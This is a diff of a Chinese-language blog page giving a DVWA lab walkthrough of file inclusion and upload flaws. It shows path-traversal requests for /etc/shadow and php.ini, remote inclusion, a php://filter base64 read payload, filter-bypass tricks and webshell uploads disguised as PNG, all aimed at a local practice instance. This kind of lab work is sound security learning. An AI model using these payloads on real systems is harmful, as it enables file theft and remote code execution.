@@ -1,185 +1,234 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="File Inclusion前言allow_url_include&#x3D;Onallow_url_open&#x3D;On(远程包含)     服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="DVWA_(FILE inclusion&amp;uploads)">
-<meta property="og:url" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/index.html">
-<meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="File Inclusion前言allow_url_include&#x3D;Onallow_url_open&#x3D;On(远程包含)     服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/1.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/2.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/3.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/4.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/5.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/6.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/7.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/8.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/9.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/10.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/11.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/12.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/13.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/14.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/15.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/16.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/17.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/18.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/19.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/20.png">
-<meta property="article:published_time" content="2018-12-28T08:40:46.000Z">
-<meta property="article:modified_time" content="2020-05-15T08:25:30.000Z">
-<meta property="article:author" content="osword">
-<meta property="article:tag" content="LFI">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/1.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>DVWA_(FILE inclusion&amp;uploads)</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>DVWA_(FILE inclusion&amp;uploads) - osword&#39;s blog</title>
 
-    <!-- persian styles -->
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
     
       
-<link rel="stylesheet" href="/css/rtl.css">
-
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.1"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2018/12/28/DVWA-XSS/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2018/12/27/DVWA-CSRF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&text=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&title=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&is_video=false&description=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=DVWA_(FILE inclusion&amp;uploads)&body=Check out this article: http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&title=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&title=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&title=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&title=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&name=DVWA_(FILE inclusion&amp;uploads)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/&t=DVWA_(FILE inclusion&amp;uploads)" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">1.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOW"><span class="toc-number">1.2.</span> <span class="toc-text">LOW</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#本地包含"><span class="toc-number">1.2.1.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程包含"><span class="toc-number">1.2.2.</span> <span class="toc-text">远程包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MEDIUM"><span class="toc-number">1.3.</span> <span class="toc-text">MEDIUM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High"><span class="toc-number">1.4.</span> <span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter-伪协议使用"><span class="toc-number">1.4.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter 伪协议使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Inlcusion"><span class="toc-number">2.</span> <span class="toc-text">File Inlcusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LOW-1"><span class="toc-number">2.1.</span> <span class="toc-text">LOW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MEDIUM-1"><span class="toc-number">2.2.</span> <span class="toc-text">MEDIUM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#扯到了菜刀原理"><span class="toc-number">2.2.1.</span> <span class="toc-text">扯到了菜刀原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决方案-分析源码"><span class="toc-number">2.2.2.</span> <span class="toc-text">解决方案(分析源码)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HIGH"><span class="toc-number">2.3.</span> <span class="toc-text">HIGH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用burpsuite无法修改后缀为php解决方案"><span class="toc-number">2.3.1.</span> <span class="toc-text">使用burpsuite无法修改后缀为php解决方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决方案"><span class="toc-number">2.3.2.</span> <span class="toc-text">解决方案</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP文件包含利用"><span class="toc-number">3.</span> <span class="toc-text">PHP文件包含利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#读取敏感文件"><span class="toc-number">3.1.</span> <span class="toc-text">读取敏感文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程包含shell"><span class="toc-number">3.2.</span> <span class="toc-text">远程包含shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地包含配合文件上传"><span class="toc-number">3.3.</span> <span class="toc-text">本地包含配合文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP封装协议"><span class="toc-number">3.4.</span> <span class="toc-text">PHP封装协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#包含Apache日志文件"><span class="toc-number">3.5.</span> <span class="toc-text">包含Apache日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#截断包含"><span class="toc-number">3.6.</span> <span class="toc-text">截断包含</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安全编写包含"><span class="toc-number">4.</span> <span class="toc-text">安全编写包含</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        DVWA_(FILE inclusion&amp;uploads)
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">osword's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2018-12-28T08:40:46.000Z" itemprop="datePublished">2018-12-28</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/LFI/" rel="tag">LFI</a>
-    </div>
-
-
-      <span id="/2018/12/28/DVWA-FILE-inclusion-uploads/" class="leancloud_visitors" data-flag-title="DVWA_(FILE inclusion&amp;uploads)">
-    <em class="post-meta-item-text">阅读量 </em>
-    <i class="leancloud-visitors-count" data-index="/2018/12/28/DVWA-FILE-inclusion-uploads/"></span>
-    </div>
-
-  </header>
   
 
-  <div class="content" itemprop="articleBody">
-    <h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>allow_url_include=On<br>allow_url_open=On(远程包含)</p>
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-12-28 16:40" pubdate>
+        2018年12月28日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">DVWA_(FILE inclusion&amp;uploads)</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>allow_url_include=On<br>allow_url_open=On(远程包含)</p>
 <blockquote>
 <blockquote>
 <blockquote>
@@ -189,31 +238,55 @@
 </blockquote>
 </blockquote>
 </blockquote>
-<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> &#x2F;&#x2F; The page we wish to display </span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ]; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php"> <span class="hljs-comment">// The page we wish to display </span></span>
+<span class="php">$file = $_GET[ <span class="hljs-string">'page'</span> ]; </span>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre>
 <p>未对传入的page文件进行任何的过滤<br>本地包含:<br>构造<code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=\etc\shadow</code>判断是否为linux系统</p>
-<p><img src="./1.png" alt=""></p>
+<p><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
 <p>报错显示为windows系统，使用绝对路径访问php.ini文件<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=F:\phpstudy\PHPTutorial\WWW\zlzhidao\php.ini</code></p>
-<p><img src="./2.png" alt=""></p>
-<p>相对路径访问php.ini<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=../../../zlzhidao/php.ini</code><br><img src="./3.png" alt=""></p>
-<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。<br>在远程服务器<code>192.168.43.195</code>上传一个<code>phpinfo.txt</code>文件，会以PHP解析在服务端打开。<br><a href="http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt" target="_blank" rel="noopener">http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt</a><br><img src="./4.png" alt=""></p>
-<p>打开百度链接<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://www.baidu.com</code><br><img src="./5.png" alt=""></p>
-<h2 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Thepagewewishtodisplay</span><br><span class="line">$file&#x3D;$_GET[&#39;page&#39;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Inputvalidation</span><br><span class="line">$file&#x3D;str_replace(array(&quot;http:&#x2F;&#x2F;&quot;,&quot;https:&#x2F;&#x2F;&quot;),&quot;&quot;,$file);</span><br><span class="line">$file&#x3D;str_replace(array(&quot;..&#x2F;&quot;,&quot;..\&quot;&quot;),&quot;&quot;,$file);</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="./2.png" srcset="/img/loading.gif" alt=""></p>
+<p>相对路径访问php.ini<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=../../../zlzhidao/php.ini</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。<br>在远程服务器<code>192.168.43.195</code>上传一个<code>phpinfo.txt</code>文件，会以PHP解析在服务端打开。<br><a href="http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt" target="_blank" rel="noopener">http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt</a><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p>
+<p>打开百度链接<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://www.baidu.com</code><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><pre><code class="hljs php">&lt;php
+
+<span class="hljs-comment">//Thepagewewishtodisplay</span>
+$file=$_GET[<span class="hljs-string">'page'</span>];
+
+<span class="hljs-comment">//Inputvalidation</span>
+$file=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"http://"</span>,<span class="hljs-string">"https://"</span>),<span class="hljs-string">""</span>,$file);
+$file=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"../"</span>,<span class="hljs-string">"..\""</span>),<span class="hljs-string">""</span>,$file);
+
+&gt;</code></pre>
 <p>服务端对<code>http:// ”、”https://”、 ” ../”、”..\”</code>替换为空字符，即删除。采用双写绕过或大小写混写就可以了。</p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Thepagewewishtodisplay</span><br><span class="line">$file&#x3D;$_GET[&#39;page&#39;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Inputvalidation</span><br><span class="line">if(!fnmatch(&quot;file*&quot;,$file)&amp;&amp;$file!&#x3D;&quot;include.php&quot;)&#123;</span><br><span class="line">   &#x2F;&#x2F;Thisisn&#39;tthepagewewant!</span><br><span class="line">echo&quot;ERROR:Filenotfound!&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code class="hljs php">&lt;php
+
+<span class="hljs-comment">//Thepagewewishtodisplay</span>
+$file=$_GET[<span class="hljs-string">'page'</span>];
+
+<span class="hljs-comment">//Inputvalidation</span>
+<span class="hljs-keyword">if</span>(!fnmatch(<span class="hljs-string">"file*"</span>,$file)&amp;&amp;$file!=<span class="hljs-string">"include.php"</span>)&#123;
+   <span class="hljs-comment">//Thisisn'tthepagewewant!</span>
+<span class="hljs-keyword">echo</span><span class="hljs-string">"ERROR:Filenotfound!"</span>;
+<span class="hljs-keyword">exit</span>;
+&#125;
+
+&gt;</code></pre>
 <p>可以看到源码对文件开头做了限制，必须时FILE开头<br>使用系统自带file://协议打开文件</p>
 <blockquote>
 <blockquote>
 <p><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=file://F:\phpstudy\PHPTutorial\WWW\zlzhidao\php.ini</code></p>
 </blockquote>
 </blockquote>
-<p><img src="./6.png" alt=""></p>
+<p><img src="./6.png" srcset="/img/loading.gif" alt=""></p>
 <h3 id="php-filter-伪协议使用"><a href="#php-filter-伪协议使用" class="headerlink" title="php://filter 伪协议使用"></a>php://filter 伪协议使用</h3><p>php://filter<br>读取文件并以base64编码返回<br>利用条件:无<br>常用payload</p>
 <blockquote>
 <blockquote>
 <p>php://filter/read=convert.base64-encode/resource=index.php</p>
 </blockquote>
 </blockquote>
-<p><img src="./7.png" alt=""></p>
+<p><img src="./7.png" srcset="/img/loading.gif" alt=""></p>
 <h1 id="File-Inlcusion"><a href="#File-Inlcusion" class="headerlink" title="File Inlcusion"></a>File Inlcusion</h1><blockquote>
 <blockquote>
 <blockquote>
@@ -223,13 +296,13 @@
 </blockquote>
 </blockquote>
 </blockquote>
-<h2 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h2><p>通过代码可看出未对文件上传做任何限制，直接上传带有一句话木马的PHP文件<br><img src="./8.png" alt=""></p>
-<h2 id="MEDIUM-1"><a href="#MEDIUM-1" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><p><img src="./9.png" alt=""><br>发现源代码对文件上传的后缀名做了限制<br>直接上传带有一句话木马的png图片<br><img src="./10.png" alt=""></p>
+<h2 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h2><p>通过代码可看出未对文件上传做任何限制，直接上传带有一句话木马的PHP文件<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="MEDIUM-1"><a href="#MEDIUM-1" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><p><img src="./9.png" srcset="/img/loading.gif" alt=""><br>发现源代码对文件上传的后缀名做了限制<br>直接上传带有一句话木马的png图片<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p>
